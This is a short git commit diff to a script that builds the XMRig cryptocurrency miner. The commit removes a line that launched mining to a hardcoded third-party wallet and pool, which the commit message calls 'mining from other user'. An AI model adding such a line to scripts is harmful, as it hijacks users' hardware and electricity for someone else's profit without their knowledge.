b5a9764dc95ccdc301fbad873637132bad349978
Cyber-Talleyrand <rdgmantuano@protonmail.com>
2023-01-28 00:18:29 +0100

    eliminate mining from other user

--- install_xmrig.sh
+++ install_xmrig.sh
@@ -13,4 +13,3 @@ git clone https://github.com/xmrig/xmrig.git
 mkdir xmrig/build && cd xmrig/build
 cmake ..
 make
-~/xmrig/build/xmrig -o pool.minexmr.com:4444 -u 45XUWhiEnAgYLTkjTHJjYeXat7pq1A3FBcBRyvrECdJu3EdNKfJuCc2JJq13u9xLbdc7dqqQ2G6veEHEr1hru5hoScFRZ9A --rig-id GitHub
